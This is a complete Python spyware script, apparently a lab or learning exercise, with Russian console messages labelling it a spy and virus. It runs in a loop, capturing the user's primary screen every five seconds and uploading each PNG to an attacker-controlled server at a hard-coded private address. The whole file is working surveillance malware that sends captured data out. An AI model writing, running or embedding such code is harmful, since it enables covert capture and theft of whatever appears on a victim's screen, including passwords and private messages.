import time
import mss
import requests
import io
import cv2
import numpy as np
from datetime import datetime

HACKER_URL = "http://192.168.56.1:5000/upload"


def main():
    print(f"--- ШПИОН АКТИВЕН ---")
    print(f"Цель: {HACKER_URL}")

    with mss.mss() as sct:
        while True:
            try:
                sct_img = sct.grab(sct.monitors[1])
                img = np.array(sct_img)
                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                _, img_encoded = cv2.imencode('.png', img)
                file_bytes = io.BytesIO(img_encoded.tobytes())

                filename = datetime.now().strftime("leak_%H-%M-%S.png")

                print(f"[VIRUS] Отправка {filename}...", end=" ")
                files = {'file': (filename, file_bytes, 'image/png')}

                response = requests.post(HACKER_URL, files=files, timeout=3)

                if response.status_code == 200:
                    print("УСПЕХ.")
                else:
                    print(f"ОШИБКА КОДА: {response.status_code}")

                time.sleep(5)

            except requests.exceptions.ConnectionError:
                print("ОШИБКА ПОДКЛЮЧЕНИЯ")
                time.sleep(5)
            except KeyboardInterrupt:
                print("\nСтоп.")
                break
            except Exception as e:
                print(f"Ошибка: {e}")
                time.sleep(1)


if __name__ == "__main__":
    main()